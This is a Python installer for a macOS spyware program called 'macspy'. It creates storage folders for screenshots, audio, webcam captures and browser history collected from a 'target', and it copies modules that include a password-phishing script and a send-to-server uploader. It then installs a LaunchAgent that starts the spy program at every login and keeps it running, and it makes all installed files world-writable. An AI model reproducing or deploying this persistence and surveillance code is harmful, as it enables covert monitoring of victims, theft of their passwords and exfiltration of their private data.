import subprocess
import os
import textwrap

def run_command(command):
    """Runs a system command and returns its response."""
    out, err = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).communicate()
    return out + err

#Directories
#Where program and its resources live
programDirectory = os.path.expanduser("~/Library/macspy")

#Where launch agents live
lauchAgentDirectory = os.path.expanduser("~/Library/LaunchAgents")
run_command("mkdir -p " + lauchAgentDirectory)

#Where data collected from target lives
programDataDirectory = programDirectory + "/Data"

#Create directories
run_command("mkdir -p " + programDirectory)
run_command("mkdir -p " + programDataDirectory)
run_command("mkdir -p " + programDataDirectory + "/screenshot")
run_command("mkdir -p " + programDataDirectory + "/audio")
run_command("mkdir -p " + programDataDirectory + "/webcam")
run_command("mkdir -p " + programDataDirectory + "/browser_history")
run_command("mkdir -p " + programDataDirectory + "/usage_intervals")


#Move files into right location
run_command("cp macspy.py " + programDirectory)
run_command("cp send_to_server.py " + programDirectory)
run_command("cp global_variables.py " + programDirectory)
run_command("cp launch_agent_factory.py " + programDirectory)
run_command("cp screenshot.py " + programDirectory)
run_command("cp webcam.py " + programDirectory)
run_command("cp audio.py " + programDirectory)
run_command("cp browser_history.py " + programDirectory)
run_command("cp usage_intervals.py " + programDirectory)
run_command("cp phish_password.py " + programDirectory)
run_command("cp jetplane.py " + programDirectory)
run_command("cp uninstall.py " + programDirectory)
run_command("touch " + programDirectory + "/sendQueue.txt")

#install dependencies
run_command("pip3 install datetime")
run_command("pip3 install json")
run_command("pip3 install textwrap")
run_command("pip3 install python-dateutil")
run_command("pip3 install sounddevice")
run_command("pip3 install soundfile")
run_command("pip3 install browserhistory")
run_command("pip3 install plotly")

pythonInterpreter = str(run_command("which python3").decode("utf-8"))[:-1]


#Create main launch agent

launchAgentFile = lauchAgentDirectory + "/macspy.plist"
programFile = programDirectory + "/macspy.py"

#Text to go in launch agent file
launchAgentConfig = textwrap.dedent(f"""\
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
	<dict>
	    <key>Label</key>
		<string>com.macspy.app</string>
		<key>ProgramArguments</key>
        <array>
            <string>{pythonInterpreter}</string>
            <string>{programFile}</string>
        </array>
        <key>StandardOutPath</key>
        <string>/Users/edward/Desktop/stdout.log</string>
        <key>StandardErrorPath</key>
        <string>/Users/edward/Desktop/stderr.log</string>
        <key>WorkingDirectory</key>
        <string>{programDirectory}</string>
		<key>RunAtLoad</key>
		<true/>
        <key>KeepAlive</key>
        <true/>
	</dict>
</plist>
""")

#Create launch agent file
with open(launchAgentFile, "w") as newLaunchAgentFile:
    newLaunchAgentFile.write(launchAgentConfig)

for item in os.listdir(programDirectory):
    os.chmod(programDirectory + "/" + item, 0o777)

for item in os.listdir(programDataDirectory):
    os.chmod(programDataDirectory + "/" + item, 0o777)

#Load launch agent
run_command("launchctl load " + launchAgentFile)

print("Installation complete!")

